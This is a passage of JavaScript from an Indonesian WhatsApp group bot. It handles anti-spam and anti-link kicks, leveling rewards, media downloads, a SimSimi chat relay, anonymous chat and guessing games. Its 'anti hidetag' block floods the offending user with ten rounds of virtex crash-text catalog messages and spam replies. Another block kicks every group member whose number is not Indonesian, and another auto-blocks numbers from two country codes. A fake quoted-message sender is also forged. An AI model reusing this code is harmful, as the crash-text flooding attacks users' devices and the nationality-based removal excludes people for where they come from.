atak.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: ridho})
};        
const sendvn = (teks) => {
atak.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}        
const sendSticker = (pesan) => {
atak.sendMessage(from, {sticker: pesan}, {quoted:setQuoted })
}
const deleteMessage = (pesan) => { 
atak.sendMessage(from, { delete : pesan.key }) 
}
//================================================================================\\
const onlyOwner = async() =>{
if (autovn){
sendvn(gakmau)
}else if (autoSticker){
sendSticker(khususowner)
}else {
setReply(mess.only.owner)
}
}
//OnlyAdmin
const onlyAdmin = async() =>{
if (autovn){
sendvn(gakmau)
}else 
if (autoSticker){
sendSticker(hanyaadmin)
}else {
setReply(mess.only.admin)
}
}
//OnlyBadmin
const onlyBadmin = async() =>{
if (autoSticker){
sendSticker(jadiinadmin)
}else {
setReply(mess.only.Badmin)
}
}
	
const onlyGroup = async() =>{
setReply(mess.only.group) 
}	

const onlyWait = async() =>{
if (autoSticker){
sendSticker(spam1)
}else {
setReply(mess.wait)
}
}	

			
const onlyRegist = async() =>{
if (autobutton){
atak.sendButMessage(from, `Kamu belum register kak\nSilahkan register terlebih dahulu`, fake, [{buttonId: `${prefix}verify`, buttonText: { displayText: "𝖉𝖆𝖋𝖙𝖆𝖗"},type: 1}],setQuoted);
}else {
setReply("Kamu belum register kak\nSilahkan register terlebih dahulu")
}						
}			

						
const onlyPrem = async() =>{
if (autobutton){
atak.sendButMessage(from, `Maaf kakak fitur ini khusus user premium\nSilahkan chat owner untuk buyprem`, fake, [{buttonId: `${prefix}owner`, buttonText: { displayText: "𝖔𝖜𝖓𝖊𝖗"},type: 1}],setQuoted);
}else {
setReply("Maaf kakak fitur ini khusus user premium\nSilahkan chat owner untuk buyprem")
}						
}
const onlyLimit = async() =>{
if (autobutton){
atak.sendButMessage(from, `Limit kamu sudah habis silahkan kirim ${prefix}ceklimit untuk mengecek limit`, fake, [{buttonId: `${prefix}ceklimit`, buttonText: { displayText: "𝖈𝖊𝖐𝖑𝖎𝖒𝖎𝖙"},type: 1}],setQuoted);
}else {
setReply(`Limit kamu sudah habis silahkan kirim ${prefix}ceklimit untuk mengecek limit`)
}						
}
//================================================================================\\
const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 5){
let Name = await atak.getName(jid+ `@s.whatsapp.net`)
if(cekBannedUser(jid, ban) && !isOwner){return}
addBanned(Name,calender,  jid, ban)          
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}


  
//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
//removeObject(spammer,"id",senderNumber)
// spammer.splice(spammer.indexOf(idgc, 1))
console.log("Sukses remove spammer")
}
SpamExpired(senderNumber, "NotCase", AntiSpam)
if(cekBannedUser(senderNumber, ban) && !isOwner){return}
if(cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log("antispam Case aktif")
return
}

//ANTI SPAM PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "30s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Ups kamu terdeteksi spam")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "30s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Ups kamu terdeteksi spam")
}
if (isCmd && !isOwner) msgFilter.addFilter(from)




//-------------------- 》SECURITY《 ------------------\\

 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
let linkgc = await atak.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
setTimeout(() => {
atak.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}   

 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
let linkgc = await atak.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
atak.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins && isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.id)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.id == member[i]) 
if (!usersId.groupAdmins ){
await atak.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
}
} 

//ANTI VIRUS
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await atak.sendMessage(from, {text:antivirus(pushname,groupName)})
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await atak.groupParticipantsUpdate(from, [sender], 'remove')
// await atak.groupSettingUpdate(from, 'announcement')
//await setReply("Group Telah Di Tutup")
await atak.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
 }

//Anti Hidetag
if(budy.startsWith(`${prefix}hidetag`) && isAntihidetag){
if(isGroupAdmins) await atak.groupParticipantsUpdate(from, [sender], 'demote')
for (let i = 0; i < 10; i++) {
await atak.sendKatalog(sender, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
let a = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
await atak.sendMessage(sender, { text: "awowkwkwk" }, { quoted: a });
await atak.sendMessage(sender, { text: "awowkwkwk" }, { quoted: lep });
await sleep(1000)
}
}
//System Expired
expiredClaim(_claim)
_sewa.expiredCheck(atak, from, sewa)
_prem.expiredCheck(premium) 

  
//AUTO REGISTER && !ridho.key.fromMe && !isOwner 
if (!isHit && isCmd){ 
addUserId(gcount, calender, pushname, senderNumber)
} 

//Auto Hit 
if(isCmd){
AddHit(senderNumber)
cmdAdd("run", "1d", hitnya)
}
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`
  
//--------------------------AREA EXP USER------------------------\\
//Exp User
if ( isHit && !itsMe && isCmd ) {

try {
if (userLevel === undefined && userId === undefined) {
addUserId(gcount, calender, pushname, senderNumber)
}

if (autoLevel){
addLevelingXp(senderNumber, amountExp)
}
if (autoLevel && userExp >= requiredExp || autoLevel && userExp == requiredExp) {
addLevelingLevel(senderNumber, 1, user)
resetLevelingXp(senderNumber, userExp)


let anune =`${userLevel}0000`
let susu = randomNomor(math(anune))
addBalance(senderNumber, susu)


//Hadiah Limit
if(userLevel >= 25){
let anuitu =`${userLevel}`
var sapi = randomNomor(math(anuitu))
tambahLimit(senderNumber, sapi)
} else {
var sapi = "0"
}


//Hadiah Premium
if(userLevel >= 50){
var atak = randomNomor(24) + "h"
_prem.addPremiumUser (sender, atak, premium)         
} else {
var atak = "0"
}

let levelnih = userLevel + 1

let teks = `*]───「 LEVEL UP 」───[*

Selamat, kamu telah naik ke level ${levelnih}
Pangkatmu saat ini adalah 「 *${userLeveling(levelnih)}* 」
Dan kamu telah mendapatkan
💳 Saldo  : Rp ${susu}
📉 Limit : ${sapi}
🎫 Premium : ${atak.split("h")[0]} Jam`
//but = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 } ];         
await setReply(teks)
}
} catch (err) {
console.error(err)
}
}



//-----------------------------------------AKHIR BATAS EXP USER-->

        
//========================================================================================================================//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')

/*
//AUTO BIO BOT FIX BY RIDHO
var slow = false
if(slow) {

} else if(!slow) {
slow = true
setInterval(() => {
atak.setStatus(`${botName} | ⏰ ${runtime(process.uptime() )}`)
slow = false
}, 30_000)
} 
*/
  
//AUTO RESPON SIMI BY DECODE DENPA 
if (!isGroup && !isCmd && !itsMe && autorespon && !isSticker && !isAudio && !isMedia) { 
try{
atak.sendPresenceUpdate('composing', from)
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`, {methods: "GET"})
let sami = simi.success  
setReply(`${sami}`)
} catch (err){
console.log(err)
setReply("Simi ga tau mau ngomong apa")
}
} 




//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await atak.sendMessage(from,{sticker: nah},{quoted: ridho})
await fs.unlinkSync(stok)
}

		
//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
console.log(color("Download video with ytdl-core"))
let atak = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await atak.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: ridho})
fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
console.log(color("Download audio with ytdl-core"))
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await atak.sendMessage(from, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: ridho })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
} 

//SOUND CLOUD DOWNLOAD MP3
const scdlMp3 = async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = getRandom('.mp3') 
let opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {   
	
let request = new FFMPEGRequest({
input: {
path: mp3File
},
output: {
path: opusFile,
bitrate: 128
}
});

Ffmpeg.convert(request)
.then( async filePath => {
  // Done
await atak.sendMessage(from, {contextInfo: {
externalAdReply: {
title: 'Speed', 
body: 'Now Playing...',
description: 'Now Playing...',
mediaType: 2,
thumbnail: await (await fetch('https://telegra.ph/file/76f08bd0aeb06c3e0c0d5.jpg')).buffer(),
mediaUrl: `https://youtube.com/watch?v=uIedYGN3NQQ`
}
}, audio:  fs.readFileSync(filePath), mimetype: 'audio/mp4' },{ quoted: ridho })
fs.unlinkSync(mp3File)
fs.unlinkSync(opusFile)
})
.catch(error => {
setReply(error)
})
})     
}



//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
const scdlDoc= async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await atak.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: ridho })
fs.unlinkSync(mp3File)
})       
} 

// Logs;
if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))

//GAME MATH FUNCTION
atak.math = atak.math ? atak.math : {}
if(isGroup && from in atak.math){
console.log(atak.math)
try{
let id = from
if (!(id in atak.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(atak.math[id][1]))
if (budy == math.result) {
addBalance(senderNumber, math.bonus)
clearTimeout(atak.math[id][3])
delete atak.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else {    
if (--atak.math[id][2] == 0) {
clearTimeout(atak.math[id][3])
delete atak.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${atak.math[id][2]} kesempatan`)
}
}catch(e){
console.log(e)
}
}

const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && ridho.message.stickerMessage.contextInfo != null ? ridho.message.stickerMessage.contextInfo.participant || "" : ""

//AUTO RESPON SIMI VIA REPLY/TAG BOT
if (Input == botNumber && isGroup && !isCmd && !isAudio || mentionByReplySticker == botNumber && isSticker && !isCmd) {
try{	
await sleep(2000)
 atak.sendPresenceUpdate('composing', from) 
if(isQuotedReplySticker || isReplySticker ){
await sleep(2000)
let namastc = await pickRandom(setiker)
console.log(namastc)
let buffer = fs.readFileSync(`./media/sticker/stick/${namastc}.webp`)
atak.sendMessage(from, {sticker: buffer}, {quoted:ridho })
} else{

let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]        
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)
  
const { findPhoneNumbersInText, parsePhoneNumber }= require('libphonenumber-js')
 let yakuk = await parsePhoneNumber("+"+senderNumber)
 let idnya = yakuk.country
  console.log(idnya)
let kata = body.replace(`@${botNumber.split("@")[0]}`, "")

let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${kata}&lc=${idnya.toLowerCase()}`, {methods: "GET"})
let sami = simi.success  

 if(sami.startsWith("Aku tidak mengerti")){
var teksnya = random
} else {
var teksnya = sami
}
   await sleep(2000)
 atak.sendMessage(from,{text: teksnya},{quoted: m})  
//setReply(`${teksnya}`)
}
} catch (err){
console.log(err)
setReply("Simi ga tau mau ngomong apa")
}
}
  
//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('212') || senderNumber.startsWith('252')
if (!isGroup && nomerAsing) {
//await atak.sendMessage(from, {image: {url: "https://telegra.ph/file/58668a8ad9af87724cd2d.jpg"},
// caption: "Fuck you bitch 🖕"})
await addBlock(sender, blocked)
console.log(`Nomer asing dari ${senderNumber}`)
return atak.updateBlockStatus(sender, "block") 
} 

//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let namastc = messagesC
let buffer = fs.readFileSync(`./media/sticker/stick/${namastc}.webp`)
atak.sendMessage(from, {sticker: buffer}, {quoted:ridho })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
let buffer = fs.readFileSync(`./media/audio/${anju}.mp3`)
atak.sendMessage(from, {audio: buffer, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': thumb}}}})
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
}

 
//AUTO REACT
let regex =[ "bilek","banh","cum","kntl","anjing","mmk","bang","wibu","pantek","pepek","hentai"]
for (let i of regex){
if (!cekSpam("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
atak.sendMessage(from, { react: { text: emot, key: ridho.key } })	
}
}

  
// BANCHAT GROUP 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}


//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}


//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 
}
let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner && !ridho.key.fromMe) return onlyOwner()
}

//FITUR USER LIMIT
if(!checkDataName("limit", "", DataId)) { 
await createDataId("limit", DataId) 
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if (!isOwner && command == i ){
if (isUserLimit(senderNumber, isPremium, isOwner)) return onlyLimit()
if (!isPremium && !isLimit)
{let ko = await atak.sendMessage(from, { text: mess.limit }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium && !isOwner) return onlyPrem() 
}


//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){
await atak.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

}                 

const caklonte = async (deskripsi ) => {
caklontong1.splice(from, 1);
console.log(deskripsi)
}
//Game cak lontong    
const butckl = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}caklontong`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuCkl(atak, caklontong, butckl, caklonte)

if (game.isCkl(from, caklontong)){
if(budy.includes("yerah")){
teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanCkl(from, caklontong)}\n\n`
for (let icak of caklontong1){
 teks += `${icak}`
 }
atak.sendButMessage(from, teks, fake, butckl) 
caklontong.splice(game.getCklPosi(from, caklontong), 1)
caklontong1.splice(from, 1);
return
}
if (budy.toLowerCase().includes(game.getJawabanCkl(from, caklontong))){
var htgtk = randomNomor(1500)
addBalance(senderNumber, htgtk)
teks = `*GAME CAK LONTONG*
Selamat jawaban kamu benar
Hadiah : Rp ${htgtk.toLocaleString()}\n\n`
for (let icak of caklontong1){
 teks += `${icak}`
 }
atak.sendButMessage(from, teks, fake, butckl) 
caklontong.splice(game.getCklPosi(from, caklontong), 1)
caklontong1.splice(from, 1);
}else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
}
 
//Game tebak kata
const butkta = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakkata`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
 game.cekWaktuTK(atak, tebakkata, butkta)
if (game.isTebakKata(from, tebakkata)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTK(from, tebakkata)}`
atak.sendButMessage(from, teks, fake, butkta) 
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
return
}
if (budy.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
var htgtk = randomNomor(1500)
addBalance(senderNumber, htgtk)
teks = `*GAME TEBAK KATA*
Selamat jawaban kamu benar
Jawaban : ${game.getJawabanTK(from, tebakkata)}
Hadiah : Rp ${htgtk.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakkata
atau tekan button di bawah ini`
atak.sendButMessage(from, teks, fake, butkta) 
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
}else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
}
 
 //Game tebak gambar
const butgam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakgambar`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTG(atak, tebakgambar, butgam)

if (game.isTebakGambar(from, tebakgambar)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTG(from, tebakgambar)}`
atak.sendButMessage(from, teks, fake, butgam) 
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
return
}
if (budy.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
var htgm = randomNomor(1500)
addBalance(senderNumber, htgm)
teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanTG(from, tebakgambar)}\nHadiah : Rp ${htgm.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}tebakgambar\natau tekan button di bawah ini`
atak.sendButMessage(from, teks, fake, butgam) 
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
} else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
}

//Game Math
const butmtk = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}math easy`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuMtk(atak, mtk, butmtk)
if (game.isMtk(from, mtk)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanMtk(from, mtk)}`
atak.sendButMessage(from, teks, fake, butmtk) 
mtk.splice(game.getMtkPosi(from, mtk), 1)
return
}
if (budy.toLowerCase().includes(game.getJawabanMtk(from, mtk)) && !itsMe){
var htgm3 = randomNomor(1500)
addBalance(senderNumber, htgm3)
teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanMtk(from, mtk)}\nHadiah : Rp ${htgm3.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}math\natau tekan button di bawah ini`
atak.sendButMessage(from, teks, fake, butmtk) 
mtk.splice(game.getMtkPosi(from, mtk), 1)
}else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
}    


//Game family 100
const butfam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}family100`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
 game.cekWaktuFam(atak, family100, butfam)
if (game.isfam(from, family100)){
 var anyingg = game.getjawaban100(from, family100)
 
 if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah :\n`
for (let i of anyingg){
teks += `- ${i}\n`
}
atak.sendButMessage(from, teks, fake, butfam) 
family100.splice(game.getfamposi(from, family100), 1)
return
}
 
for (let i of anyingg){
if (budy.toLowerCase().includes(i)){
var htgm1 = randomNomor(1500)
addBalance(senderNumber, htgm1)
teks = `Selamat jawaban kamu benar\nJawaban : ${i}\nHadiah : Rp ${htgm1.toLocaleString()}\n\nJawaban yang blum tertebak : ${anyingg.length - 1}`
atak.sendButMessage(from, teks, fake, butfam) 
var anug = anyingg.indexOf(i)
anyingg.splice(anug, 1)
return
} else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
return
}
}

if (anyingg.length < 1){
reply(`Semua jawaban sudah tertebak\nKirim ${prefix}family100 untuk bermain lagi`)
family100.splice(game.getfamposi(from, family100), 1)
}
}   


//Game tebak bendera
const butben = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakbendera`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTB(atak, tebakbendera, butben)

if (game.isTebakBendera(from, tebakbendera)){
if(budy.includes("Nyerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTB(from, tebakbendera)}`
atak.sendButMessage(from, teks, fake, butben) 
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
return
}
if (budy.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
var syahira = randomNomor(1500)
addBalance(senderNumber, syahira)
teks = `*GAME TEBAK BENDERA*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTB(from, tebakbendera)}\nHadiah : Rp ${syahira.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakbendera`
atak.sendButMessage(from, teks, fake, butben) 
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
} else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
}

//Game tebak anime
const butanim = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakanime`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTA(atak, tebakanime, butanim)
if (game.isTebakAnime(from, tebakanime)){
if(budy.includes("yerah")){
teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTA(from, tebakanime)}`
atak.sendButMessage(from, teks, fake, butanim) 
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
return
}
if (budy.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
var vinna = randomNomor(1500)
addBalance(senderNumber, vinna)
teks =`*GAME TEBAK ANIME*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTA(from, tebakanime)}\nHadiah : Rp ${vinna.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakanime`
atak.sendButMessage(from, teks, fake, butanim) 
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
}else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
} 	        

//Game tebak lirik
const butlirik = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebaklirik`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
